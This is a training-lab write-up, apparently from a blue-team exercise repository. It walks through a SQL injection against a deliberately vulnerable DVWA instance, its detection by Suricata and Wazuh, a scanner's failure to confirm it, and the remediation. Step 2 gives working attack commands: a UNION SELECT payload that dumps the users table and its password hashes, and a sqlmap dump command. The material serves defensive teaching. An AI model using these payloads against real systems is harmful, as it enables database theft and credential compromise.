# Exercise 02 – SQL Injection on the Hidden DVWA → Caught by the Network IDS

A full "zero to fixed" blue team exercise, with a twist on exercise 01: this
one is caught by Suricata watching the wire, not by file-integrity
monitoring or an access-log volume rule. The attack side below is a
**hands-on walkthrough, not a script** – every command is something you
type yourself in the `kali` terminal, one tool at a time. Every command and
every line of output below was actually run against the lab to produce
this document – the alert IDs, rule IDs, IRIS alert number and scan result
are real, not illustrative.

## The scenario

**Vulnerability:** the hidden DVWA app at `/legacy/` (see the main
[README](../../README.md)'s "Red team exercise" section for how it's found)
has its SQL Injection page set to DVWA's "low" security level by default –
`target`'s own provisioning ships it that way. At that level, the `id`
parameter is concatenated straight into a SQL query with no sanitisation at
all, so a single crafted request can pull an entire table out of the
database.

**Root cause, in the fictional sysadmin's own words:** "Northgate's web
team spun up DVWA years ago to test something, left the default settings
in place, and the app just kept running." Nobody set it to a safer level
because nobody remembered it was still there – the same "forgotten, not
actively broken" pattern as exercise 01, just with a different kind of
forgotten setting.

## Roles

- **Red cell / instructor:** runs `enable-vulnerability.sh` on `target`
  (this one setup step is scripted – it's building the lab, not attacking
  it), then works through Step 2 below on `kali` by hand, without telling
  the trainee what was done.
- **Blue team / trainee:** only looks at Wazuh (and later Greenbone) to
  figure out what happened, then fixes it.

## Step 1 – Red cell: make sure the vulnerability is on

```bash
vagrant ssh target
sudo bash exercises/02-dvwa-sqli/enable-vulnerability.sh
```

This is usually a no-op – `provision/target/install.sh` already ships DVWA
at `default_security_level = 'low'`. It exists so the exercise works even
if the app has been left on a different level (e.g. after running this
exercise's own `fix.sh`, or the main TUTORIAL's by-hand walkthrough).

## Step 2 – Red cell: attack it by hand

Everything from here on is typed directly into a `kali` shell
(`vagrant ssh kali`) – no wrapper script runs this for you.

**2a. Recon – confirm what's listening:**

```bash
nmap -sV -p80 10.10.20.10
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

**2b. Get a session.** DVWA's injection page needs a logged-in session
either way, so log in first – either through your own browser at
`http://localhost:8446/legacy/login.php` (admin/password, then copy the
`PHPSESSID` cookie from your browser's dev tools), or directly from the
kali terminal with `curl`, which is what the commands below assume:

```bash
JAR=$(mktemp)
TOKEN=$(curl -s -c "$JAR" http://10.10.20.10/legacy/login.php \
         | grep -o "user_token' value='[^']*'" | sed "s/.*value='//;s/'//")
curl -s -b "$JAR" -c "$JAR" -o /dev/null -L -X POST http://10.10.20.10/legacy/login.php \
     -d "username=admin&password=password&Login=Login&user_token=${TOKEN}"
```

**2c. SQL injection – a classic `UNION SELECT`, by hand:**

```bash
curl -s -G http://10.10.20.10/legacy/vulnerabilities/sqli/ -b "$JAR" \
     --data-urlencode "id=1' UNION SELECT user, password FROM users-- -" \
     --data-urlencode "Submit=Submit" \
   | grep -o '<pre>ID:[^<]*<br />[^<]*<br />[^<]*</pre>' \
   | sed -E 's/<pre>//; s/<\/pre>//; s/<br \/>/, /g'
```

```
ID: 1' UNION SELECT user, password FROM users-- -, First name: admin, Surname: admin
ID: 1' UNION SELECT user, password FROM users-- -, First name: admin, Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' UNION SELECT user, password FROM users-- -, First name: gordonb, Surname: e99a18c428cb38d5f260853678922e03
ID: 1' UNION SELECT user, password FROM users-- -, First name: 1337, Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' UNION SELECT user, password FROM users-- -, First name: pablo, Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' UNION SELECT user, password FROM users-- -, First name: smithy, Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

One request, one `UNION SELECT`, the whole user table – including
password hashes an attacker would take offline and crack at their leisure.
No automation needed – `curl` and a classic payload typed by hand is
enough.

**2d. Or let `sqlmap` do the same thing automatically** (the `grep`/`sed`
above is just there to tidy up `curl`'s raw HTML – `sqlmap` needs none of
that, it understands DVWA's response on its own):

```bash
sqlmap -u "http://10.10.20.10/legacy/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=<your session id from 2b>" \
       --batch --technique=U --dump -D dvwa -T users
```

Same result, found and extracted automatically instead of hand-crafted –
and it trips Suricata just as hard, usually harder: `sqlmap`'s own request
patterns (its User-Agent, its specific payload shapes) match several ET
signatures of their own, on top of the one the manual payload above
already matches.

## Step 3 – Blue team: find it in Wazuh

Open the Wazuh dashboard (`https://localhost:8444`) → **Discover**, with
the `wazuh-alerts-*` index pattern selected, and filter by rule group
`minisoc_ids`. In this real run:

| # | Source | Rule | Level | What it tells you |
|---|---|---|---|---|
| 1 | Suricata (ET Open ruleset) | `100100` – *"Suricata [high]: ET WEB_SERVER SELECT USER SQL Injection Attempt in URI"* (custom rule, re-rates the stock `86601` by Suricata's own severity field) | 12 | A high-severity web application attack signature matched, naming the exact technique. |

Level ≥ 10, so it's forwarded automatically to **DFIR-IRIS**
(`https://localhost:8445`) as a new alert with `10.10.66.10` as the
indicator of compromise and `target` as the affected asset – in this real
run it landed as IRIS alert **#5544**. Escalate it into a case there to
document the investigation.

This is a genuinely different detection path from exercise 01's: nothing
here comes from a file appearing, or from counting how many times something
happened – a single packet on the wire, read by a sensor that has no IP
address and isn't in the path at all, was enough. That's also its limit:
Suricata only sees requests that *look* like known attack patterns. A more
careful, obfuscated SQL injection (or one that didn't match any ET
signature) could sail through Suricata entirely and leave this exercise
with nothing to show – a real limitation of signature-based network IDS,
not a flaw specific to this lab.

**Note on the fix to get here:** rules `100100`/`100101` (Suricata
high/medium severity escalation) and `100110` (the port-scan correlation
rule) had a real bug that meant none of them had ever actually fired in
this project's history before 2026-10-20 – see "Problems solved along the
way" in the main documentation for the full story. This exercise is what
surfaced it: writing it meant actually checking whether a known-high-severity
SQLi signature produced a level-12 alert, and it didn't, until the bug was
fixed.

## Step 4 – Blue team: try to confirm it with Greenbone (and learn why you can't)

Open Greenbone (`https://localhost:9392`) → **Scans → Reports** and look at
the most recent report for `target`. In a real completed scan of this lab
(report from 2026-10-19, severity 10.0 overall from the exercise 01
finding), there is **no SQL injection finding anywhere in the report** –
not for DVWA, not for anything else on the host.

This is the honest, important contrast with exercise 01: Greenbone's NVTs
are built to recognise *generic* signatures of known software and known
misconfigurations (an FTP banner, a writable directory, a missing header).
They have no idea what `/legacy/vulnerabilities/sqli/?id=` means, or that
its `id` parameter is unsafe – that's an application-specific business
logic flaw in custom code, not a fingerprintable product or setting. A
vulnerability scanner is the wrong tool for this job, full stop; no amount
of rescanning would find it. Confirming a finding like this for real takes
either a dedicated web-app scanner (which would need to be pointed
specifically at this parameter) or, as here, a human reading the IDS alert
and verifying the request by hand. That's a realistic and common gap
between "automated scanning says the network is fine" and "the application
running on it is not" – exactly the kind of thing worth knowing before
trusting a scan report as the whole picture.

## Step 5 – Blue team: fix it

```bash
vagrant ssh target
sudo bash exercises/02-dvwa-sqli/fix.sh
```

This moves DVWA's default security level to `high`, which builds the SQL
query safely instead of concatenating raw input into it. Re-run Step 2
(2b with a *fresh* `$JAR`, then 2c) afterwards to confirm:

```
(no rows come back - the payload no longer works)
```

That's the loop closed: *vulnerable* → *exploited* → *detected* →
*(scanner can't confirm, and that's the lesson)* → *fixed* → *verified
fixed by re-running the same attack*, each step backed by something that
was actually run, not assumed to work.

One real caveat worth knowing: DVWA also remembers a visitor's security
level in a `security` cookie, separately from the server-side default.
`fix.sh` changes the default for *new* sessions; a browser tab (or `$JAR`)
that was already sitting on "Low" before the fix ran needs a fresh login
to see the change – not a bug in the fix, just how DVWA's own convenience
feature works.

## Files in this exercise

| File | Runs on | Purpose |
|---|---|---|
| `enable-vulnerability.sh` | `target` | Makes sure DVWA's default security level is "low" (idempotent, reversible). This is environment setup, so it's scripted – the attack in Step 2 deliberately isn't. |
| `fix.sh` | `target` | Remediation: moves the default security level to "high". |

## Why this design (and what it deliberately isn't)

This exercise reuses DVWA's own built-in security-level mechanism as both
the vulnerability and the fix, rather than hand-rolling a separate
vulnerable endpoint – DVWA was built specifically to teach this exact
contrast (same-looking page, different code paths underneath), and that's
a more honest demonstration than something bespoke would be. The attack
side is deliberately not a single script: `enable-vulnerability.sh` and
`fix.sh` set up and tear down the lab environment (not the attacker's job
in a real engagement), but Step 2 is run by hand, tool by tool, exactly as
typed above – `curl` first to understand exactly what the request looks
like, `sqlmap` second to see the same thing automated. The detection side
is deliberately narrow: this exercise exists to show what Suricata *can*
catch (a known, signature-matched attack pattern) and what Greenbone
*can't* (an application logic flaw), as a direct contrast with exercise
01's file-integrity-based detection and the main README's login
brute-force exercise, which is caught by Apache access-log *volume* alone.
Three different attacks, three different detection mechanisms, three
different honest limits – that's the point.
